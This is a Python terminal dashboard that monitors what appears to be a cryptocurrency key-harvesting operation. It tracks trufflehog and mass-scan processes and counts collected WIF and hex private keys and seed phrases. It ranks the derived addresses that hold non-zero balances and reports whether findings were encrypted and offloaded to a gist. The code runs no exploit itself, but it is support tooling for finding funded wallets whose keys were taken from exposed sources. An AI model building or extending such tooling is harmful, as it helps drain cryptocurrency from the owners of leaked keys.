#!/usr/bin/env python3
"""
Live crypto-scan dashboard for Termux.

Usage:
    python3 ~/dashboard.py              # print once
    python3 ~/dashboard.py --watch      # refresh every 15s
    python3 ~/dashboard.py -w -i 5      # refresh every 5s
"""
import argparse
import itertools
import json
import os
import shutil
import signal
import sys
import threading
import time
from collections import defaultdict
from datetime import datetime, timezone

HOME = os.path.expanduser("~")

PID_DIR = os.path.join(HOME, ".run_pids")
STATUS_FILE = os.path.join(HOME, "crypto_scanner_status.txt")
MEMORY_FILE = os.path.join(HOME, "crypto_scanner_memory.jsonl")
CACHE_FILE = os.path.join(HOME, "balance_cache.jsonl")
HITS_FILE = os.path.join(HOME, "balances_hit.jsonl")
RESULTS_FILE = os.path.join(HOME, ".trufflehog_results.jsonl")
MASS_FILE = os.path.join(HOME, ".trufflehog_mass_results.jsonl")
LAUNCH_LOG = os.path.join(HOME, "launch_all.log")
SCANNER_LOG = os.path.join(HOME, "crypto_scanner_scanner.log")
ENCRYPT_MANIFEST = os.path.join(HOME, ".encrypt_manifest.json")
ENCRYPTED_FILES = [
    os.path.join(HOME, "crypto_scanner_memory.jsonl.enc"),
    os.path.join(HOME, "high_confidence_hits.jsonl.enc"),
    os.path.join(HOME, "balances_hit.jsonl.enc"),
]

CHAIN_COLORS = {
    "btc": "\033[93m", "eth": "\033[96m", "ltc": "\033[94m",
    "sol": "\033[95m", "doge": "\033[92m", "matic": "\033[95m",
    "avax": "\033[91m", "bnb": "\033[93m", "base": "\033[96m",
    "xrp": "\033[94m", "ton": "\033[94m", "monad": "\033[92m",
}
RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
GREEN = "\033[92m"
RED = "\033[91m"


def color_chain(chain):
    c = CHAIN_COLORS.get(chain.lower(), "")
    return f"{c}{chain.upper()}{RESET}"


def is_running(pid_file):
    if not os.path.exists(pid_file):
        return False
    try:
        with open(pid_file) as f:
            pid = int(f.read().strip().split()[0])
        os.kill(pid, 0)
        return True
    except Exception:
        return False


def proc_running(pattern: str) -> bool:
    """True if a live python process matches pattern."""
    try:
        import subprocess
        r = subprocess.run(["pgrep", "-af", pattern], capture_output=True, text=True, timeout=5)
        if r.returncode != 0:
            return False
        for line in (r.stdout or "").splitlines():
            if "pgrep" in line or "bash -c" in line:
                continue
            if pattern in line and "python" in line:
                return True
        return False
    except Exception:
        return False


def file_lines(path):
    """Fast line estimate. Never full-scan multi-GB files (that blanks the dash)."""
    if not os.path.exists(path):
        return 0
    try:
        size = os.path.getsize(path)
        if size == 0:
            return 0
        if size <= 2_000_000:
            with open(path, "rb") as f:
                return sum(1 for _ in f)
        with open(path, "rb") as f:
            head = f.read(512_000)
            try:
                f.seek(-min(256_000, size), 2)
            except OSError:
                f.seek(0)
            tail = f.read(256_000)
        nl = bytes([10])
        sample = head + nl + tail
        n = sample.count(nl) or 1
        avg = max(len(sample) / n, 40.0)
        return int(size / avg)
    except Exception:
        return 0


def file_size(path):
    try:
        return os.path.getsize(path)
    except Exception:
        return 0


def human_size(n):
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}TB"


def disk_info():
    """Return (used_human, avail_human, use_pct, filesystem) for home dir."""
    try:
        usage = shutil.disk_usage(HOME)
        total = usage.total / (1024 * 1024)
        used = (usage.total - usage.free) / (1024 * 1024)
        avail = usage.free / (1024 * 1024)
        pct = (used / total * 100) if total > 0 else 0
        return used, avail, pct
    except Exception:
        return 0, 0, 0


def encrypt_status():
    """Return list of status lines about encrypted findings."""
    lines = []
    manifest = {}
    if os.path.exists(ENCRYPT_MANIFEST):
        try:
            with open(ENCRYPT_MANIFEST, "r") as f:
                manifest = json.load(f)
        except Exception:
            pass

    if manifest:
        when = manifest.get("encrypted_at", "?")
        url = manifest.get("gist_url", "")
        files = manifest.get("files", [])
        lines.append(f"  Status : {GREEN}ENCRYPTED{RESET}")
        lines.append(f"  Gist   : {url}")
        lines.append(f"  At     : {when}")
        lines.append(f"  Files  : {len(files)} encrypted")
    else:
        any_encrypted = any(os.path.exists(f) for f in ENCRYPTED_FILES)
        if any_encrypted:
            lines.append(f"  Status : {RED}PARTIAL{RESET} (some .enc files exist but no manifest)")
        else:
            lines.append(f"  Status : {DIM}Not encrypted{RESET}")
            lines.append(f"  Run    : encrypt_offload.py --encrypt")
    return lines


def parse_status():
    if not os.path.exists(STATUS_FILE):
        return {}
    try:
        with open(STATUS_FILE) as f:
            text = f.read().strip()
        out = {}
        for part in text.split(","):
            kv = part.strip().split("=", 1)
            if len(kv) == 2:
                out[kv[0].strip()] = kv[1].strip()
        return out
    except Exception:
        return {}


def load_jsonl_tail(path, n=10):
    if not os.path.exists(path):
        return []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if line.strip()]
        return [json.loads(line) for line in lines[-n:]]
    except Exception:
        return []


EVM_CHAINS = {
    "eth", "matic", "avax", "bnb", "base", "arb", "op", "monad",
    "ftm", "cro", "gno", "scrl", "linea", "blast", "zksync",
}


def _norm_addr(chain, addr):
    """Normalize (chain, addr) so EVM casing does not split the same wallet."""
    chain = (chain or "?").lower()
    addr = addr or ""
    if chain in EVM_CHAINS:
        return chain, addr.lower()
    return chain, addr


def summarize_balances():
    """Aggregate cached balances. Prefer newest ts per normalized (chain, addr)."""
    totals = defaultdict(float)
    latest = {}
    latest_ts = {}
    newest_check = None
    if not os.path.exists(CACHE_FILE):
        return totals, latest, newest_check
    try:
        with open(CACHE_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    rec = json.loads(line)
                except Exception:
                    continue
                chain = (rec.get("chain") or "?").lower()
                addr = rec.get("address") or ""
                if not addr:
                    continue
                key = _norm_addr(chain, addr)
                ts = float(rec.get("ts") or 0)
                if key in latest_ts and ts < latest_ts[key]:
                    continue
                latest_ts[key] = ts
                bal = rec.get("balance")
                if bal is None and (rec.get("settled") or rec.get("invalid")):
                    bal = 0.0
                # keep display address from newest record
                latest[key] = {"balance": bal, "address": addr, "checked_at": rec.get("checked_at"), "ts": ts}
                ca = rec.get("checked_at")
                if ca and (newest_check is None or ca > newest_check):
                    newest_check = ca
        # flatten to (chain, display_addr) -> bal for callers
        flat = {}
        for (chain, _naddr), info in latest.items():
            bal = info["balance"]
            flat[(chain, info["address"])] = bal
            if isinstance(bal, (int, float)) and bal > 1e-12:
                totals[chain] += float(bal)
        return totals, flat, newest_check
    except Exception:
        return totals, latest, newest_check


def nonzero_hits():
    """Deduped nonzero hits (cache + hits file), highest balance wins."""
    best = {}  # norm_key -> rec
    for path in (CACHE_FILE, HITS_FILE):
        if not os.path.exists(path):
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        rec = json.loads(line)
                    except Exception:
                        continue
                    bal = rec.get("balance")
                    if not isinstance(bal, (int, float)) or bal <= 1e-12:
                        continue
                    chain = (rec.get("chain") or "?").lower()
                    addr = rec.get("address") or ""
                    if not addr:
                        continue
                    nk = _norm_addr(chain, addr)
                    prev = best.get(nk)
                    pts = float((prev or {}).get("ts") or 0)
                    ts = float(rec.get("ts") or 0)
                    # prefer higher balance; tie-break newer ts
                    if prev is None or float(bal) > float(prev.get("balance") or 0) or (
                        float(bal) == float(prev.get("balance") or 0) and ts >= pts
                    ):
                        best[nk] = {
                            "chain": chain,
                            "address": addr,
                            "balance": float(bal),
                            "ts": ts,
                            "checked_at": rec.get("checked_at"),
                            "source": rec.get("source") or path,
                        }
        except Exception:
            pass
    hits = sorted(best.values(), key=lambda r: -float(r.get("balance") or 0))
    return hits


def latest_memory_highlights(n=8):
    out = []
    for rec in load_jsonl_tail(MEMORY_FILE, n=n):
        findings = rec.get("findings", {})
        ts = rec.get("ts", "?")
        items = []
        for chain in ("btc", "eth", "ltc", "sol", "doge", "xrp", "ton", "avax", "matic", "bnb", "base", "monad"):
            for addr in findings.get(chain, [])[:2]:
                items.append((chain, addr[:20] + ("..." if len(addr) > 20 else "")))
        wallet = findings.get("wallet", {})
        if wallet.get("wifs"):
            items.append(("wif", f"{len(wallet['wifs'])} WIF(s)"))
        if wallet.get("hex_keys"):
            items.append(("hex", f"{len(wallet['hex_keys'])} hex key(s)"))
        if wallet.get("seed_phrases"):
            items.append(("seed", f"{len(wallet['seed_phrases'])} seed(s)"))
        if items:
            out.append((ts, items))
    return out



def wallet_truth_summary(max_wallets=6):
    """Wallet truth from balance cache + hits. Never blocks the dash.

    Previous bug: only matched memory-tail derived_addresses (case-sensitive)
    against cache, so funded hits showed total=0 even when cache had balance.
    Now: truth = every nonzero cached/hit address (deduped, EVM-normalized),
    plus unique key counts from a memory tail for context.
    """
    try:
        # --- balances: newest per normalized key ---
        balances = {}  # norm -> (display_chain, display_addr, bal, ts, checked_at)
        newest = None
        if os.path.exists(CACHE_FILE) and os.path.getsize(CACHE_FILE) > 0:
            with open(CACHE_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        rec = json.loads(line)
                    except Exception:
                        continue
                    chain = (rec.get("chain") or "?").lower()
                    addr = rec.get("address") or ""
                    if not addr:
                        continue
                    nk = _norm_addr(chain, addr)
                    ts = float(rec.get("ts") or 0)
                    prev = balances.get(nk)
                    if prev and prev[3] > ts:
                        continue
                    bal = rec.get("balance")
                    if bal is None and (rec.get("settled") or rec.get("invalid")):
                        bal = 0.0
                    ca = rec.get("checked_at")
                    balances[nk] = (chain, addr, bal, ts, ca)
                    if ca and (newest is None or ca > newest):
                        newest = ca

        # merge hits file (may have fresher nonzero)
        if os.path.exists(HITS_FILE):
            with open(HITS_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        rec = json.loads(line)
                    except Exception:
                        continue
                    bal = rec.get("balance")
                    if not isinstance(bal, (int, float)):
                        continue
                    chain = (rec.get("chain") or "?").lower()
                    addr = rec.get("address") or ""
                    if not addr:
                        continue
                    nk = _norm_addr(chain, addr)
                    ts = float(rec.get("ts") or 0)
                    prev = balances.get(nk)
                    if prev is None or ts >= prev[3] or (
                        isinstance(bal, (int, float))
                        and bal > 1e-12
                        and not (isinstance(prev[2], (int, float)) and prev[2] > 1e-12)
                    ):
                        # keep higher nonzero if timestamps close
                        if prev and isinstance(prev[2], (int, float)) and prev[2] > float(bal):
                            if ts < prev[3]:
                                continue
                        ca = rec.get("checked_at")
                        balances[nk] = (chain, addr, float(bal), ts, ca)
                        if ca and (newest is None or ca > newest):
                            newest = ca

        # --- unique keys in memory tail (context only) ---
        key_set = set()
        if os.path.exists(MEMORY_FILE):
            with open(MEMORY_FILE, "rb") as f:
                f.seek(0, 2)
                size = f.tell()
                f.seek(max(0, size - 2_000_000))
                tail = f.read().decode("utf-8", errors="ignore")
            for line in tail.splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    rec = json.loads(line)
                except Exception:
                    continue
                findings = rec.get("findings") or {}
                wallet = findings.get("wallet") or {}
                for wif in wallet.get("wifs") or []:
                    if wif:
                        key_set.add(("WIF", str(wif).strip()))
                for hx in wallet.get("hex_keys") or []:
                    if not hx:
                        continue
                    h = str(hx).strip().lower().removeprefix("0x")
                    if len(h) == 64:
                        key_set.add(("HEX", h))
                for seed in wallet.get("seed_phrases") or []:
                    if seed:
                        key_set.add(("SEED", str(seed).strip()))

        nonzero = []
        pending = 0
        zeroed = 0
        total = 0.0
        for nk, (chain, addr, bal, ts, ca) in balances.items():
            if bal is None:
                pending += 1
            elif isinstance(bal, (int, float)) and bal > 1e-12:
                nonzero.append((chain, addr, float(bal)))
                total += float(bal)
            elif isinstance(bal, (int, float)):
                zeroed += 1
        nonzero.sort(key=lambda x: -x[2])

        return {
            "wallets": len(key_set),
            "addresses": len(balances),
            "nonzero": nonzero[:12],
            "nonzero_count": len(nonzero),
            "pending": pending,
            "zeroed": zeroed,
            "total": total,
            "newest": newest,
        }
    except Exception:
        return None


def render(spinner_char=""):
    cols, _rows = shutil.get_terminal_size((80, 24))
    bar = "=" * cols
    thin = "-" * cols

    scanner_running = (
        is_running(os.path.join(PID_DIR, "crypto_scanner.pid"))
        or proc_running("crypto_scanner.py")
    )
    mass_running = (
        is_running(os.path.join(PID_DIR, "mass_scan.pid"))
        or is_running(os.path.join(PID_DIR, "adaptive_scan.pid"))
        or proc_running("mass_scan.py")
        or proc_running("adaptive_throttler.py")
    )
    keep_running = (
        is_running(os.path.join(PID_DIR, "keepalive.pid"))
        or proc_running("keepalive.py")
    )

    status = parse_status()
    totals, latest, newest_check = summarize_balances()
    hits = nonzero_hits()

    lines = []
    lines.append(bar)
    lines.append(f"{BOLD}  CRYPTO SCAN DASHBOARD {spinner_char}{RESET}")
    lines.append(bar)
    lines.append(f"  Updated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
    lines.append("")

    lines.append(f"{BOLD}  PROCESSES{RESET}")
    lines.append(thin)
    s_state = f"{GREEN}RUNNING{RESET}" if scanner_running else f"{RED}STOPPED{RESET}"
    m_state = f"{GREEN}RUNNING{RESET}" if mass_running else f"{RED}STOPPED{RESET}"
    k_state = f"{GREEN}RUNNING{RESET}" if keep_running else f"{RED}STOPPED{RESET}"
    lines.append(f"  Keepalive      : {k_state}")
    lines.append(f"  Crypto scanner : {s_state}")
    lines.append(f"  Mass / adaptive: {m_state}")
    lines.append("")

    lines.append(f"{BOLD}  SCANNER STATUS{RESET}")
    lines.append(thin)
    if status:
        for k, v in status.items():
            lines.append(f"  {k:12s} : {v}")
    else:
        lines.append("  (no status file yet)")
    lines.append("")

    lines.append(f"{BOLD}  FILES{RESET}")
    lines.append(thin)
    files = [
        ("Mass results", MASS_FILE),
        ("Scan results", RESULTS_FILE),
        ("Memory", MEMORY_FILE),
        ("Balance cache", CACHE_FILE),
        ("Balance hits", HITS_FILE),
    ]
    for label, path in files:
        ln = file_lines(path)
        sz = human_size(file_size(path))
        lines.append(f"  {label:15s} : {ln:>8,} lines  ({sz})")
    lines.append("")

    lines.append(f"{BOLD}  BALANCE SUMMARY{RESET}")
    lines.append(thin)
    if latest:
        total_addrs = len(latest)
        nonzero = sum(1 for bal in latest.values() if isinstance(bal, (int, float)) and bal > 1e-12)
        pending = sum(1 for bal in latest.values() if bal is None)
        lines.append(f"  Addresses checked : {total_addrs:,}")
        lines.append(f"  Non-zero balances : {nonzero}")
        if pending:
            lines.append(f"  Pending / failed  : {pending}")
        if newest_check:
            lines.append(f"  Last on-chain     : {newest_check}")
        for chain in sorted(totals.keys(), key=lambda c: -totals[c]):
            bal = totals[chain]
            if bal > 0:
                lines.append(f"  {color_chain(chain):>6s} total : {bal:,.8f}")
        if not totals:
            lines.append("  (all checked balances are zero or pending)")
    else:
        lines.append("  (no balances cached yet)")
    lines.append("")

    # Wallet truth = cache/hits (deduped). Key count from memory tail.
    wt = wallet_truth_summary()
    if wt is not None:
        nz_n = wt.get("nonzero_count", len(wt.get("nonzero") or []))
        lines.append(f"{BOLD}  WALLET TRUTH (CACHE + HITS, DEDUPED){RESET}")
        lines.append(thin)
        lines.append(f"  Unique keys (mem tail): {wt['wallets']:,}")
        lines.append(f"  Addresses in cache    : {wt['addresses']:,}")
        lines.append(f"  Nonzero / zero / pend : {nz_n} / {wt.get('zeroed', 0)} / {wt['pending']}")
        lines.append(f"  Total nonzero         : {GREEN}{wt['total']:,.8f}{RESET}")
        if wt.get("newest"):
            lines.append(f"  Last on-chain check   : {wt['newest']}")
        if wt["nonzero"]:
            for chain, addr, bal in wt["nonzero"][:8]:
                lines.append(
                    f"  {GREEN}***{RESET} {color_chain(chain)} {addr:<42s} {bal:,.8f}"
                )
        else:
            lines.append("  (no nonzero balances in cache/hits yet)")
        lines.append(f"  {DIM}Run: walletview   (paged live viewer){RESET}")
        lines.append("")

    if hits:
        lines.append(f"{BOLD}  NONZERO BALANCE HITS ({len(hits)} unique){RESET}")
        lines.append(thin)
        for rec in hits[:8]:
            chain = rec.get("chain", "?")
            addr = rec.get("address", "")
            bal = rec.get("balance", 0)
            when = (rec.get("checked_at") or "?")
            when = when[11:19] if "T" in when else when[:8]
            lines.append(f"  [{when}] {color_chain(chain)} {addr:<42s} {bal:,.8f}")
        if len(hits) > 8:
            lines.append(f"  {DIM}… +{len(hits) - 8} more{RESET}")
        lines.append("")

    mem = latest_memory_highlights(n=6)
    if mem:
        lines.append(f"{BOLD}  LATEST MEMORY ACTIVITY{RESET}")
        lines.append(thin)
        for ts, items in mem:
            short_ts = ts[11:19] if "T" in ts else ts
            parts = []
            for c, v in items[:4]:
                if c in ("wif", "hex", "seed"):
                    parts.append(f"{c.upper()} {v}")
                else:
                    parts.append(f"{color_chain(c)} {v}")
            lines.append(f"  [{short_ts}] {', '.join(parts)}")
        lines.append("")

    lines.append(bar)
    lines.append(f"  {DIM}Logs: tail -f {LAUNCH_LOG} | tail -f {SCANNER_LOG}{RESET}")
    lines.append(bar)

    return "\n".join(lines)


class Spinner:
    def __init__(self):
        self._stop = threading.Event()
        self._char = " "
        self._thread = threading.Thread(target=self._spin, daemon=True)

    def _spin(self):
        for char in itertools.cycle(["|", "/", "-", "\\"]):
            if self._stop.is_set():
                break
            self._char = char
            time.sleep(0.15)

    def start(self):
        self._thread.start()

    def stop(self):
        self._stop.set()
        self._thread.join()

    @property
    def char(self):
        return self._char


def clear_screen():
    sys.stdout.write("\033[H\033[2J\033[3J")
    sys.stdout.flush()


def watch(interval=15):
    spinner = Spinner()
    spinner.start()

    # Track user interaction to pause refresh cycles.
    # When the user presses a key (scrolls/interacts), we stop the normal
    # refresh loop, wait for them to finish, then wait a full minute before
    # resuming the 15-second refresh cycle.
    _stdin_fd = sys.stdin.fileno()
    _orig_flags = None
    try:
        import termios
        _orig_flags = termios.tcgetattr(_stdin_fd)
        new_flags = termios.tcgetattr(_stdin_fd)
        new_flags[3] &= ~termios.ICANON  # disable canonical mode
        new_flags[6][termios.VMIN] = 0   # non-blocking read
        new_flags[6][termios.VTIME] = 0  # no timeout
        termios.tcsetattr(_stdin_fd, termios.TCSANOW, new_flags)
    except (ImportError, termios.error, AttributeError):
        pass  # not a TTY or termios unavailable

    user_active = False
    user_active_at = 0.0
    cooled_down = False

    def _check_user_input():
        """Return True if the user pressed a key."""
        try:
            import select
            if select.select([sys.stdin], [], [], 0)[0]:
                ch = sys.stdin.read(1)
                return bool(ch)
        except Exception:
            pass
        return False

    def on_sigint(_sig, _frame):
        spinner.stop()
        if _orig_flags is not None:
            try:
                termios.tcsetattr(_stdin_fd, termios.TCSANOW, _orig_flags)
            except Exception:
                pass
        clear_screen()
        print(safe_render(" "))
        print("\nDashboard stopped.")
        sys.exit(0)

    signal.signal(signal.SIGINT, on_sigint)

    try:
        while True:
            # Check for user keypress (scroll / interaction)
            if _check_user_input():
                user_active = True
                user_active_at = time.time()

            # If user was active, wait for them to finish then a full minute cooldown
            if user_active:
                elapsed_since_active = time.time() - user_active_at
                # Give the user 1 second after last keypress, then 60s cooldown
                if elapsed_since_active >= 61:
                    user_active = False
                    cooled_down = True
                    user_active_at = 0.0
                # Still animating the spinner while waiting
                clear_screen()
                print(f"  {BOLD}Dashboard paused — interaction detected{RESET}")
                print(f"  Resuming auto-refresh in {max(0, 61 - int(elapsed_since_active))}s...")
                print(f"  (Press Ctrl+C to stop)")
                time.sleep(1)
                continue

            # Normal refresh cycle
            clear_screen()
            print(safe_render(spinner.char))

            # Sleep in small slices so we can still detect user input
            remaining = interval
            while remaining > 0 and not user_active:
                time.sleep(min(1, remaining))
                remaining -= 1
    except KeyboardInterrupt:
        on_sigint(None, None)


def safe_render(spinner_char=""):
    try:
        return render(spinner_char)
    except Exception as exc:
        msg = [
            BOLD + '  DASHBOARD ERROR (services may still be running)' + RESET,
            '  ' + str(exc),
            '  Try: watch2   or   walletview',
        ]
        return chr(10).join(msg) + chr(10)


def main():
    parser = argparse.ArgumentParser(description="Live crypto-scan dashboard")
    parser.add_argument("-w", "--watch", action="store_true", help="refresh continuously")
    parser.add_argument("-i", "--interval", type=int, default=15, help="refresh interval in seconds (default 15)")
    args = parser.parse_args()

    if args.watch:
        watch(args.interval)
    else:
        print(safe_render())


if __name__ == "__main__":
    main()
